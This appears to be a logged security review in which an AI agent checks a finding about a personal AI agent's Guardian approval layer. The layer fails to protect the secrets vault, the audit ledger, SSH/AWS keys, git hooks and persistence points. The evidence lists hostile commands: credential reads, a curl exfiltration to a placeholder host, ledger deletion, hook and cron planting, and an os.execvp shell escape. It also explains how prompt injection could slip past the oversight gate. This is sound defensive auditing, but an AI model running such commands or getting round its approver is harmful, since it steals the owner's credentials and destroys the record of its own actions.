# refute:proportionality:The vault, the ledger and the machine ar

*Workflow: review · Phase: Refute · Agent id: `a189e0c8c735397cc` · Tool calls: 9*

## Task given to the agent

```text
You are reviewing the ARCHITECTURE of Simorgh, a self-improving personal AI agent written in Python (stdlib-first) at /Users/saeed/ws/Simorgh. The creator built it from scratch: ~87k lines in simorgh/, 18 subsystems (one package each) composed by a Kernel, talking only via typed messages on an async Bus, all state in an append-only Ledger of events, a Guardian that is the sole approver of every effect (HMAC token re-verified by Execution), worktree-isolated self-patching, a bootloader (simloader.py) that gates the checkout with the unit suite and rolls back. It chats (CLI/TUI/HTTP/Telegram/WhatsApp), talks (voice pipeline), controls the house (Home Assistant, Reolink cameras, Ring, Cast/Android TV), and runs benchmarks (GAIA/BFCL/SWE-bench).
  
  The creator asked: "review its architecture, evaluate it, tell me where I went wrong and how to improve it."
  
  Ground rules for you:
  - Read the CODE, not the docs, to establish what is true today. docs/EVOLUTION.md (5,254 lines) is a HISTORY; a bug it describes has very likely been fixed since. Do not report a historical finding as current state.
  - Previous reviews already exist and you must NOT simply repeat them. Already known (do not re-report unless you have something materially new to add): cameras use local ffmpeg/HLS instead of Home Assistant; self_patch.draft tool is named in learning/pipeline.py but not registered; Self Model capabilities["tools"] is never populated; no in-prompt sliding dialogue buffer for chat turns (orchestration/context.py); Ledger default backend is JSONL and ~1.4 GB; CHAT profile binds 34 tools; STT latency degrades under self-inflicted load; "unconnected wire" (designed slot, one side implemented, nobody writes it) is the project's dominant bug shape; test coverage thin in persona/learning/worldmodel; sim.sh auto-approve flips one boolean. Read docs/architecture-review-2026-09-18.html and docs/architecture-audit-2026.md quickly if you want the full list.
  - Useful orientation docs (read briefly, then go to code): docs/module-map.md, docs/architecture.md, docs/blueprint/02-system-architecture.md, docs/blueprint/03-contracts-and-messaging.md.
  - Every finding MUST cite file:line evidence you actually read, and where feasible a command whose output you quote. If a claim depends on runtime behaviour, try to establish it by a cheap command (python -c import + inspect, grep, wc, reading ~/.simorgh/simorgh.toml, listing ~/.simorgh/ledger). Do NOT boot the full system, do NOT run the full test suite, do NOT run anything that calls a paid model, do NOT modify any file in the repo.
  - Think like a senior systems architect. Distinguish (a) a design decision that is wrong or over-built for this system's real scale (one laptop, one family), (b) a design that is right but the implementation undermines it, (c) a genuine bug. Say which.
  - Your final text is data for an orchestrator, not a message to a human. Return only the structured output.
  
  
  You are a SKEPTIC. A reader claimed the following finding about concern "safety-guardian-execution". Your job is to try to REFUTE it by reading the code it cites and the code around it. Lens: even if true, is it actually an architectural problem at this system's scale (one laptop, one family, one developer), or is the recommendation disproportionate / would create more work than it saves?
  
  FINDING:
  {
    "title": "The vault, the ledger and the machine are outside every protected list; run_shell reads secrets.toml, ~/.ssh and ~/.aws and can rewrite the vault",
    "kind": "missing",
    "severity": "critical",
    "claim": "Protected subjects are 12 repo-relative substrings; `~/.simorgh/secrets.toml` (0600, holds every provider token, the HA token, SIM_API_TOKEN), `~/.simorgh/ledger` (the audit trail), `.git/hooks`, `~/.ssh`, `~/.aws` and the macOS keychain are reachable by `run_shell` and, via `os.execvp`, by `run_script` in the CHAT profile, and Guardian approves all of it under the live default.",
    "evidence": [
      "simorgh/guardian/config.py:21-41 DEFAULT_PROTECTED_SUBJECTS -- all repo paths; only `simorgh.toml` is a filename match",
      "Offline pipeline with live default: `approved cat ~/.simorgh/secrets.toml`; `approved curl -s -X POST --data-binary @$HOME/.simorgh/secrets.toml https://...`; `approved printf ... > ~/.simorgh/secrets.toml`; `approved find ~/.simorgh/ledger -type f -delete`; `approved python3 -c \"import shutil; shutil.rmtree('/Users/saeed/.simorgh/ledger')\"`; `approved cat ~/.ssh/id_ed25519`; `approved cat ~/.aws/credentials`; `approved security find-generic-password -ga github`; `approved printf '#!/bin/sh...' > .git/hooks/post-checkout`; `approved launchctl load ~/Library/LaunchAgents/x.plist`; `approved (crontab -l; echo ...) | crontab -`",
      "simorgh/execution/shell.py:53-118 refusal list has no entry for ~/.simorgh, .git/hooks, ssh, crontab install, launchctl, osascript; `refusal_for(...)` returned None for every command above",
      "`ls -la ~/.simorgh/secrets.toml` -> `-rw------- ... 2116 bytes`",
      "simorgh/orchestration/profiles.py:59 CHAT includes `run_script`; offline pipeline: `approved run_python_sandboxed {'code': \"import os\\nos.execvp('/bin/sh',['sh','-c','cat ~/.simorgh/secrets.toml'])\"}` (same code-scan rules apply to run_script)",
      "sim.sh:42-52 runs `git checkout \"$LAST_GOOD\" -- simloader.py` during recovery, which fires a post-checkout hook"
    ],
    "why_it_matters": "This is the answer to 'what stops Sim from harming the creator's machine or accounts today': for the machine and the accounts, nothing but the model's disposition. The ledger is the system's memory of what it did and can be erased by the thing it records; a planted git hook runs inside the bootloader's own rollback path; the vault can be repointed at an attacker's Home Assistant.",
    "recommendation": "Stop trying to enumerate bad commands and confine the process instead. On macOS, run every subprocess-spawning tool (`run_shell`, `run_script`, `SkillTool`, `run_python_sandboxed`) under `sandbox-exec` with a profile that denies reads of `~/.simorgh/secrets.toml`, `~/.ssh`, `~/.aws`, the keychain, and writes to `~/.simorgh/ledger`, `.git/hooks`, `~/Library/LaunchAgents`; or run them as a separate low-privilege user. Until then: add `~/.simorgh/`, `.git/`, `~/.ssh`, `~/.aws`, `~/Library` to the protected substring list (cheap, one line, closes the literal cases the pipeline already catches for `simorgh.toml`), and move the ledger to a path the sandbox denies.",
    "confidence": 0.95
  }
  
  Default to refuted=true if you cannot verify the claim yourself against file:line evidence. Verify with commands where cheap (grep, python -c, wc). Do not boot the system or run the suite. Return only the structured verdict.
```

## What the agent did (tool trail)

| # | Tool | What | Result (first 160 chars) |
|---|---|---|---|
| 1 | Read | /Users/saeed/ws/Simorgh/simorgh/guardian/config.py | 1 """Guardian configuration (09-guardian.md section 3.5). A subset of the 2 spec's full table. `budget_pressure_tighten_at` and `max_consecutive_ 3 failures` ar |
| 2 | Read | /Users/saeed/ws/Simorgh/simorgh/execution/shell.py | 1 """Real shell access, through Guardian rather than around it. 2 3 The creator, 2026-09-07: "give sim file system write access and shell 4 access". 5 6 This is |
| 3 | Bash | Inspect Guardian rules, profiles, run_script, sim.sh and config | 28:# Tools whose subject argument names a file this proposal would touch -- 31:_SUBJECT_ARG_KEYS = ("subject", "path") 37:# execution/ is itself one of the prot |
| 4 | Bash | Read the protected rule, sim.sh auto-approve, and run_script tool |  try: return shlex.join(str(v) for v in value) except (TypeError, ValueError): return " ".join(str(v) for v in value) return None # A protected subject mentione |
| 5 | Bash | Find auto-approve source, script env passthrough, bandit presence, guardian pipeline entry points | simorgh/kernel/registry.py:106: `SIMORGH_GUARDIAN_AUTO_APPROVE` docstring), the same simorgh/kernel/service.py:194: # `SIMORGH_GUARDIAN_AUTO_APPROVE=0` or `[gua |
| 6 | Bash | Locate auto-approve wiring, live toml, and pipeline test pattern | 22:export SIMORGH_EXECUTION_REPO_ROOT="${SIMORGH_EXECUTION_REPO_ROOT:-$REPO_ROOT}" self.bus = make_bus_client(self._bus_backend, source="kernel", ledger=self.le |
| 7 | Bash | Run Guardian pipeline offline on the claimed commands and check ledger path | Traceback (most recent call last): File "/private/tmp/claude-501/-Users-saeed-ws-Simorgh/488b3cca-edac-4c83-98e1-f1e7db34bf14/scratchpad/skeptic.py", line 2, in |
| 8 | Bash | Run the offline Guardian pipeline check with the repo on the path | pipeline: ['paused', 'mode', 'protected', 'scope', 'denylist', 'static_analysis', 'shellcheck', 'package', 'grant', 'immunity', 'budget', 'reversibility'] appro |
| 9 | Bash | Test whether the interim protected-list fix would close the cases; check sandbox-exec availability | approved 'cat ~/.simorgh/secrets.toml' approved 'curl -s -X POST --data-binary @$HOME/.simorgh/secrets.toml https://e/x' denied "printf 'x' > ~/.simorgh/secrets |

## Structured reply

**refuted:** False

**verdict:** confirmed

**reasoning:** Every element of the claim reproduces against current code. (1) simorgh/guardian/config.py:21-41 DEFAULT_PROTECTED_SUBJECTS is 12 repo-relative strings; nothing under ~/.simorgh, ~/.ssh, ~/.aws, .git or ~/Library. (2) simorgh/guardian/rules.py:272-334 ProtectedRule only compares mentioned paths against that list, and rules.py:212-231 only extracts paths from a code/command payload when _WRITE_SIGNS (rules.py:200-207) matches -- `cat`, `curl --data-binary @file`, `find -delete`, `launchctl` and `crontab -` are not write signs, so reads/exfil are structurally invisible to the protected layer even if the list were extended. (3) simorgh/execution/shell.py:59-117 DEFAULT_SHELL_REFUSALS has no entry for ~/.simorgh, .git/hooks, ssh, aws, keychain, crontab install, launchctl; shell.py:20-27 itself says the list is "not an attempt at a security boundary". (4) simorgh/kernel/service.py:194-202 sets `irreversible_requires_human` default False for the running system, so ReversibilityRule converts escalate to allow. (5) I ran the real rules.DEFAULT_PIPELINE (12 rules, bandit 1.9.4 present so StaticAnalysisRule was live) with Config(irreversible_requires_human=False): all 11 attack commands were `approved`, the control `echo x > simorgh.toml` was `denied`, and refusal_for() returned None for every shell command. (6) simorgh/orchestration/profiles.py:59 CHAT includes run_script (not run_shell); simorgh/execution/script.py:43-96 runs the code with sys.executable, network, and HOME/PATH passed through (execution/config.py:315-318), and guardian/config.py:46-79 DEFAULT_DENYLIST has no os.exec* pattern, so `os.execvp('/bin/sh', ...)` is approved -- reproduced. (7) sim.sh:45 runs `git checkout "$LAST_GOOD" -- simloader.py`, which does fire a post-checkout hook; .git/hooks currently has no active hooks but is writable via run_shell. ~/.simorgh/secrets.toml is 0600, 2116 bytes; ledger default data_dir is ~/.simorgh/ledger (ledger/config.py:19).

Skeptic lens (is it disproportionate at one-laptop scale?): No. The design premise is "Guardian is the sole approver and the protected set is what the system may never touch" (corrigibility); the protected set carefully covers the bootloader and config but omits the vault, the audit trail and the user's account credentials, which are the same category and higher value. The realistic threat at this scale is not a malicious Sim but a prompt-injected mail/web/Telegram turn reaching the CHAT profile that holds run_script with network access -- one approved call exfiltrates every provider token plus SSH/AWS keys. That is a category-(b) finding: the sole-approver design is right, but text-matching enumerations cannot implement it for a tool that spawns a shell, as shell.py's own docstring concedes. This is materially new relative to the known "auto-approve flips one boolean" item because it identifies the concrete assets outside every list and the run_script exec vector in CHAT.

One correction to the RECOMMENDATION, not the claim: the "cheap one-line" interim fix is weaker than stated. I re-ran the pipeline with `~/.simorgh/`, `.simorgh/`, `.git/`, `.ssh`, `.aws`, `Library` appended to protected_subjects: only the two `printf > ...` writes were denied; `cat ~/.simorgh/secrets.toml`, the curl exfil, `find ~/.simorgh/ledger -type f -delete`, `cat ~/.ssh/id_ed25519`, `launchctl load`, and `cd ~/.simorgh && cat secrets.toml` all stayed approved, because ProtectedRule is write-only by design and `-delete`/`launchctl` are not write signs. So process confinement (sandbox-exec is present at /usr/bin/sandbox-exec; or a separate low-privilege user) is the only part of the recommendation that closes the reads and the ledger deletion; the list edit closes 2 of 8 cases.

### evidence

- simorgh/guardian/config.py:21-41 -- DEFAULT_PROTECTED_SUBJECTS: docs/SOUL.md, src/orchestrator/*, simorgh/guardian/, simorgh/execution/, simorgh/contracts/, simorgh/kernel/, simorgh.toml, simloader.py, sim.sh; no home-directory or .git entry
- simorgh/guardian/rules.py:200-231 -- _WRITE_SIGNS regex gates whether paths in a command/code payload are checked at all; `cat`, `curl --data-binary @`, `find -delete`, `launchctl`, `crontab -` do not match
- simorgh/guardian/rules.py:272-334 -- ProtectedRule substring-matches mentioned paths against protected_subjects; read-shaped programs abstain by design
- simorgh/execution/shell.py:59-117 -- DEFAULT_SHELL_REFUSALS; shell.py:20-27: 'Not an attempt at a security boundary -- a shell has no such thing'
- simorgh/execution/shell.py:222-226 -- subprocess.run(command, shell=True, cwd=root, env=_child_env()) with no filesystem confinement
- simorgh/kernel/service.py:194-202 -- guardian_section.setdefault('irreversible_requires_human', False): the running default auto-approves
- simorgh/orchestration/profiles.py:59 -- CHAT profile tool list includes 'run_script' (run_shell is only in the task profiles at lines 104 and 138)
- simorgh/execution/script.py:43-96 -- run_script writes code to a file and runs it with sys.executable, cwd=repo_root, env from script_env_passthrough; simorgh/execution/config.py:315-318 passes PATH, HOME, LANG, LC_ALL, TMPDIR, proxies
- simorgh/guardian/config.py:46-79 -- DEFAULT_DENYLIST covers os.system, subprocess.*, socket, urllib, eval/exec, ctypes, os.set*id; no os.exec* pattern
- Command: PYTHONPATH=. python3 skeptic.py (real rules.DEFAULT_PIPELINE, Config(irreversible_requires_human=False), bandit 1.9.4 installed) -> approved: `cat ~/.simorgh/secrets.toml`, `curl -s -X POST --data-binary @$HOME/.simorgh/secrets.toml https://...`, `printf 'x' > ~/.simorgh/secrets.toml`, `find ~/.simorgh/ledger -type f -delete`, `cat ~/.ssh/id_ed25519`, `cat ~/.aws/credentials`, `printf ... > .git/hooks/post-checkout`, `(crontab -l; echo ...) | crontab -`, `launchctl load ~/Library/LaunchAgents/x.plist`, run_script and run_python_sandboxed with `os.execvp('/bin/sh',['sh','-c','cat ~/.simorgh/secrets.toml'])`; denied: control `echo x > simorgh.toml`; refusal_for() returned None for every shell command
- Command: same pipeline with protected_subjects extended by ~/.simorgh/, .simorgh/, .git/, .ssh, .aws, Library -> denied only the two `printf > ...` writes; cat/curl/find -delete/launchctl/`cd ~/.simorgh && cat secrets.toml` still approved
- `ls -la ~/.simorgh/secrets.toml` -> -rw------- 1 saeed staff 2116 Sep 18 15:04; `ls ~/.simorgh/` shows ledger/ alongside secrets.toml; simorgh/ledger/config.py:19 data_dir = '~/.simorgh/ledger'
- sim.sh:42-45 -- `git checkout "$LAST_GOOD" -- simloader.py` in the recovery path (post-checkout hook fires on a path checkout); `ls -la .git/hooks` shows no active hooks today
- `ls -la /usr/bin/sandbox-exec` -> present (102560 bytes); `grep -rn sandbox-exec simorgh/` -> no use anywhere

**severity adjustment:** keep

**corrected claim:** Claim stands as written. Recommendation correction: extending protected_subjects with home-directory entries only blocks write-shaped commands (2 of the 8 reproduced cases); reads, curl exfil, `find -delete` on the ledger and launchctl/crontab persistence pass regardless because ProtectedRule is write-only by design. Only process confinement (sandbox-exec, present on this machine, or a separate low-privilege user) or moving secrets/ledger out of the child's reach closes the read and delete cases.

